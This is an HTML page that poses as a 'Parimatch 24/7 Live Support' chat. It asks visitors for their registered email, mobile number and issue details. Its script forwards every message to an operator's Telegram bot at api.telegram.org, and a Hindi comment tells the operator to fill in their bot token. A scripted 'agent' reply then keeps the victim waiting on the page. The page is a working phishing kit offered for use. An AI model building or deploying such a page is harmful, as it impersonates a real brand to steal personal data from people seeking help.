<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Support - Parimatch</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #0b0b0b;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            padding: 12px;
            overflow: hidden;
        }

        .container {
            width: 100%;
            max-width: 440px;
            height: 100%;
            display: flex;
            flex-direction: column;
        }

        /* Top Header Bar */
        .form-header-bar {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 10px;
            padding-top: 4px;
            flex-shrink: 0;
        }

        .back-btn {
            background: #d4ff00;
            color: #000;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            text-decoration: none;
            border: none;
        }

        .brand-pill {
            display: inline-flex;
            align-items: center;
            background-color: #161616;
            border: 1.5px solid #d4ff00;
            padding: 6px 16px;
            border-radius: 30px;
            gap: 8px;
        }

        .parimatch-badge {
            background: #d4ff00;
            color: #000;
            font-weight: 900;
            font-style: italic;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            letter-spacing: -0.5px;
        }

        .support-text {
            font-size: 13px;
            font-weight: 700;
            color: #ffffff;
        }

        /* Chat Box Wrapper */
        .chat-box {
            background-color: #121212;
            border: 1.5px solid #d4ff00;
            border-radius: 20px;
            display: flex;
            flex-direction: column;
            flex-grow: 1;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            margin-bottom: 10px;
        }

        /* Agent Status Header */
        .chat-agent-header {
            background-color: #1a1a1c;
            padding: 12px 16px;
            border-bottom: 1px solid #27272a;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-shrink: 0;
        }

        .agent-avatar {
            width: 36px;
            height: 36px;
            background: #d4ff00;
            color: #000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 14px;
        }

        .agent-info h4 {
            font-size: 13px;
            font-weight: 700;
            color: #fff;
        }

        .agent-info p {
            font-size: 10px;
            color: #22c55e;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        /* Messages Area */
        .chat-messages {
            flex-grow: 1;
            padding: 16px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .message {
            max-width: 80%;
            padding: 10px 14px;
            border-radius: 14px;
            font-size: 12px;
            line-height: 1.4;
        }

        .message.received {
            background-color: #1c1c1e;
            color: #fff;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
            border: 1px solid #27272a;
        }

        .message.sent {
            background-color: #d4ff00;
            color: #000;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
            font-weight: 500;
        }

        .msg-time {
            font-size: 9px;
            color: #9ca3af;
            margin-top: 4px;
            text-align: right;
        }

        .message.sent .msg-time {
            color: #374151;
        }

        /* Input Footer Area */
        .chat-input-area {
            background-color: #161618;
            padding: 12px;
            border-top: 1px solid #27272a;
            display: flex;
            gap: 8px;
            flex-shrink: 0;
        }

        .chat-input-area input {
            flex-grow: 1;
            background-color: #1c1c1e;
            border: 1px solid #27272a;
            border-radius: 10px;
            padding: 10px 14px;
            color: #fff;
            font-size: 12px;
            outline: none;
        }

        .chat-input-area input:focus {
            border-color: #d4ff00;
        }

        .send-btn {
            background-color: #d4ff00;
            color: #000;
            border: none;
            border-radius: 10px;
            padding: 0 16px;
            font-weight: 800;
            cursor: pointer;
            font-size: 12px;
            text-transform: uppercase;
        }

        .send-btn:active {
            transform: scale(0.95);
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Header Bar with Back Link -->
    <div class="form-header-bar">
        <a href="../index.html" class="back-btn">❮</a>
        <div class="brand-pill">
            <div class="parimatch-badge">PARI<i>MATCH</i></div>
            <div class="support-text">Support</div>
        </div>
    </div>

    <!-- Chat Box Container -->
    <div class="chat-box">
        <div class="chat-agent-header">
            <div class="agent-avatar">PM</div>
            <div class="agent-info">
                <h4>Support Expert #409</h4>
                <p>● Online & Ready to Help</p>
            </div>
        </div>

        <div class="chat-messages" id="chatMessages">
            <div class="message received">
                👋 Hello! Welcome to Parimatch 24/7 Live Support. Please share your Registered Email ID, Mobile Number, and issue details so I can assist you right away.
                <div class="msg-time">Just now</div>
            </div>
        </div>

        <form class="chat-input-area" id="chatForm" onsubmit="sendChatMessage(event)">
            <input type="text" id="chatInput" placeholder="Type your message here..." required autocomplete="off">
            <button type="submit" class="send-btn">Send</button>
        </form>
    </div>
</div>

<script>
    function sendChatMessage(event) {
        event.preventDefault();

        const inputField = document.getElementById('chatInput');
        const messageText = inputField.value.trim();
        if (!messageText) return;

        const messagesContainer = document.getElementById('chatMessages');
        const currentTime = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

        // 1. Add User Message to Chat Bubble
        const userMsgDiv = document.createElement('div');
        userMsgDiv.className = 'message sent';
        userMsgDiv.innerHTML = `${escapeHtml(messageText)}<div class="msg-time">${currentTime}</div>`;
        messagesContainer.appendChild(userMsgDiv);

        inputField.value = '';
        messagesContainer.scrollTop = messagesContainer.scrollHeight;

        // ⚠️ APNE TELEGRAM BOT KA TOKEN AUR CHAT ID YAHAN REPLACE KAREIN ⚠️
        const botToken = 'YOUR_BOT_TOKEN_HERE';
        const chatId = 'YOUR_CHAT_ID_HERE';

        const telegramText = `💬 *LIVE CHAT MESSAGE* 💬\n\n${messageText}`;

        // 2. Forward to Telegram Bot
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: telegramText,
                parse_mode: 'Markdown'
            })
        }).catch(err => console.error('Telegram Error:', err));

        // 3. Simulate Agent Auto Reply after 1.5 seconds
        setTimeout(() => {
            const agentMsgDiv = document.createElement('div');
            agentMsgDiv.className = 'message received';
            agentMsgDiv.innerHTML = `Thank you for the details. Our support executive is verifying your account data. Please stay on this page.<div class="msg-time">${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</div>`;
            messagesContainer.appendChild(agentMsgDiv);
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
        }, 1500);
    }

    function escapeHtml(text) {
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return text.replace(/[&<>"']/g, function(m) { return map[m]; });
    }
</script>

</body>
</html>
